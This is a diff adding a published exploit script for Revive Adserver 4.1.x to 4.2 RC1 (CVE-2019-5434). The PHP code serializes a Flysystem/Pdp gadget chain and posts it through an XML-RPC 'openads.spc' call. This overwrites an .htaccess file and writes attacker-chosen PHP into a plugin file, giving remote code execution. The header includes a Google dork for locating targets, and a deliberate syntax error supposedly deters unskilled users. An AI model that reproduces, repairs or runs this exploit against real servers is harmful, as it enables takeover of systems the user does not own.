@@ -1,0 +1,155 @@
+# Exploit Title: Revive Adserver 4.2 - Remote Code Execution
+# Google Dork: "inurl:www/delivery filetype:php"
+# Exploit Author: crlf
+# Vendor Homepage: https://www.revive-adserver.com/
+# Software Link: https://www.revive-adserver.com/download/archive/
+# Version: 4.1.x <= 4.2 RC1
+# Tested on: *nix
+# CVE : CVE-2019-5434
+# Сontains syntax error for protection against skids
+
+
+<?php
+# Revive Adserver 4.1.x <= 4.2 RC1 PHP Object Injection to Remote Code Execution (CVE-2019-5434)
+# coded by @crlf, with love for antichat.com
+# special thanks to @Kaimi :)
+# the script should be used only for educational purposes!
+
+namespace{
+  (!isset($argv[2]) ? exit(message('php '.basename(__FILE__).' https://example.com/adserver-dir/ \'<?php phpinfo(); ?>\'')) : @list($x, $url, $code) = $argv);
+
+  $source = 'data:text/html;base64,'.base64_encode('#');
+  $destination = 'plugins/.htaccess';
+  #$destination = 'var/.htaccess';
+
+  if(!strpos(request($url, $source, $destination), 'methodResponse')) exit(message('failed, no valid response from '.$url));
+
+  $source = 'data:text/html;base64,'.base64_encode($code);
+  $destination = 'plugins/3rdPartyServers/ox3rdPartyServers/doubleclick.class.php';
+  #$destination = 'var/default.conf.php';
+
+  request($url, $source, $destination);
+  message('check '.$url.$destination);
+
+  function request($url, $source, $destination){
+
+    $what = serialize(
+         ['what' =>
+            new Pdp\Uri\Url(
+                new League\Flysystem\File( $destination,
+                    new League\Flysystem\File( 'x://'.$source,
+                        new League\Flysystem\MountManager(
+                            new League\Flysystem\Filesystem(
+                                new League\Flysystem\Config,
+                                new League\Flysystem\Adapter\Local('')
+                            ),
+                            new League\Flysystem\Plugin\ForcedCopy
+                        )
+                    )
+                )
+            )
+         ]
+     );
+
+    $what = str_replace(['\Uri\Url\00'],['\5CUri\5CUrl\00'], str_replace(['s:', сhr(0)],['S:', '\\00'], $what));
+
+    $xml = '<?xml version="1.0" encoding="ISO-8859-1"?>
+              <methodCall>
+               <methodName>openads.spc</methodName>
+               <params>
+                 <param>
+                   <value>
+                     <struct>
+                       <member>
+                         <name>remote_addr</name>
+                         <value>8.8.8.8</value>
+                       </member>
+                       <member>
+                         <name>cookies</name>
+                         <value>
+                           <array>
+                           </array>
+                         </value>
+                       </member>
+                     </struct>
+                   </value>
+                 </param>
+                 <param><value><string>'.$what.'</string></value></param>
+                 <param><value><string>0</string></value></param>
+                 <param><value><string>dsad</string></value></param>
+                 <param><value><boolean>1</boolean></value></param>
+                 <param><value><boolean>0</boolean></value></param>
+                 <param><value><boolean>1</boolean></value></param>
+               </params>
+             </methodCall>';
+
+    return file_get_contents($url.'adxmlrpc.php', false, stream_context_create(
+                             ['http' =>
+                               ['method' => 'POST',
+                                'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0',
+                                'header' =>'Content-type: application/x-www-form-urlencoded',
+                                'content'=> $xml
+                                ]
+                             ])
+           );
+  }
+
+  function message($str){
+     print PHP_EOL.'### '.$str.' ###'.PHP_EOL.PHP_EOL;
+  }
+}
+
+namespace League\Flysystem\Plugin{
+  class ForcedCopy{}
+}
+
+namespace League\Flysystem{
+  class Config{
+    protected $settings = [];
+    public function __construct(){
+       $this->settings = ['disable_asserts' => true];
+    }
+  }
+  class Filesystem{
+    protected $adapter;
+    protected $config;
+     public function __construct($config,$adapter){
+       $this->config = $config;
+       $this->adapter = $adapter;
+     }
+  }
+  class MountManager{
+    protected $filesystems = [];
+    protected $plugins = [];
+     public function __construct($filesystem, $handler){
+       $this->filesystems = ['x' => $filesystem];
+       $this->plugins = ['__toString' => $handler];
+     }
+  }
+  class File{
+    protected $path;
+    protected $filesystem;
+    public function __construct($path, $obj){
+      $this->filesystem = $obj;
+      $this->path = $path;
+    }
+  }
+}
+
+namespace League\Flysystem\Adapter{
+  class Local{
+    protected $pathPrefix;
+    public function __construct($prefix){
+       $this->pathPrefix = $prefix;
+     }
+  }
+}
+
+namespace Pdp\Uri{
+  class Url{
+    private $host;
+    public function __construct($file){
+      $this->host = $file;
+    }
+  }
+}
